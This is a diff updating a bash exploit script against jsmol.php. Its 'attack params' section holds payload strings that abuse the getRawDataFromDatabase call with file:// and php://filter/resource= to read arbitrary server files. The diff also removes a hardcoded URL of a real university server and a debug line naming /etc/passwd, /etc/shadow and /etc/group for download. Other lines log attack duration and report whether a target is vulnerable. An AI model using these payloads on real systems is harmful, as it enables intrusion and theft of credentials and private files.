@@ -7,7 +7,8 @@
 # V 1.1 09.02.2020
 # V 1.2 10.02.2020
 # V 1.3 11.02.2020
-script_version='1.3'
+# V 1.4 11.02.2020
+script_version='1.4'
 #############################################################################################
 # INCLUDES
 #############################################################################################
@@ -26,12 +27,9 @@ done
 # attack params
 #############################################################################################
 
-#jsmolphp_url='http://www.lct.jussieu.fr/pagesperso/orbimol/script/jsmol/php/jsmol.php'
 jsmolphp_url="$1"
 payload_txt='call=getRawDataFromDatabase&query=file://'
 payload_b64='isform=true&call=getRawDataFromDatabase&source=post_page---------------------------&query=php://filter/resource='
-#debug : ligne a supprimer
-#download_files='/etc/passwd /etc/shadow /etc/group'
 
 #############################################################################################
 # WORKING VARS
@@ -183,7 +181,7 @@ if [ "$question_attack_again" != "no" ] && [ "$question_attack_again" != "NO" ] 
 	else
 		showTitle "$target_result_title_not_vulnerable" "$c_error""$target_result_text_not_vulnerable" "1"
 	fi
-	#logging in history file=
+	#logging in history file
 	attack_date_end=$(/bin/date "+%s")
 	attack_duration=$(( $attack_date_end-$attack_date_start ))
 	attack_duration_txt=$( secondsToTime "$attack_duration" )
